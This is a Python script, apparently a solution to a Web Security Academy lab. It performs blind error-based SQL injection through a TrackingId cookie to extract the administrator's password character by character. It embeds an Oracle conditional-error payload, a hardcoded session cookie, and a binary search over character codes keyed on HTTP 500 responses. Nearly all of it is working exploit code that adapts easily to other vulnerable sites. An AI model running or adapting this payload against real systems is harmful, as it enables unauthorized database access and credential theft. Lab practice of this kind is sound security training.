import requests
import math
import time

url = "https://0aa800b704da34bc8045081600d40097.web-security-academy.net"


def test(code, index):
    cookie = {
        "session": "Tv9ipoyc7KiDuHpQWF6NVYO68LqBp6Kf",
        "TrackingId": "L3pZeBwQQmPouDx6' AND (SELECT CASE WHEN (SUBSTR(password," + str(index) + ", 1) >= '" + chr(code) + "') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator' )='a"}
    response = requests.get(url, cookies=cookie)
    if response.status_code == 500:
        return True
    else:
        return False


def test2(code, index):

    cookie = {
        "session": "Tv9ipoyc7KiDuHpQWF6NVYO68LqBp6Kf",
        "TrackingId": "L3pZeBwQQmPouDx6' AND (SELECT CASE WHEN (SUBSTR(password," + str(index) + ", 1) = '" + chr(code) + "') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator' )='a"}
    response = requests.get(url, cookies=cookie)
    if response.status_code == 500:
        return True
    else:
        return False


LIST = [
    48,
    49,
    50,
    51,
    52,
    53,
    54,
    55,
    56,
    57,
    58,
    59,
    60,
    61,
    62,
    63,
    64,
    65,
    66,
    67,
    97,
    98,
    99,
    100,
    101,
    102,
    103,
    104,
    105,
    106,
    107,
    108,
    109,
    110,
    111,
    112,
    113,
    114,
    115,
    116,
    117,
    118,
    119,
    120,
    121,
    122,
]


def main(index):
    start = 0
    end = len(LIST)
    prev = 0
    while True:
        current = math.floor((start + end) / 2)
        result1 = test(LIST[current], index)
        if current == prev:
            result2 = test2(LIST[current], index)
            if result2:
                return True, chr(LIST[current])
            else:
                break
        if result1:
            start = current - 1
        else:
            end = current + 1
        prev = current
    while True:
        current = math.ceil((start + end) / 2)
        result1 = test(LIST[current], index)
        if current == prev:
            result2 = test2(LIST[current], index)
            if result2:
                return True, chr(LIST[current])
            else:
                break
        if result1:
            start = current - 1
        else:
            end = current + 1
        prev = current


index = 0
password = ""
while True:
    result = main(index)
    index += 1
    if result[0]:
        password += result[1]
        print(password)
        continue
    else:
        break
print(password)
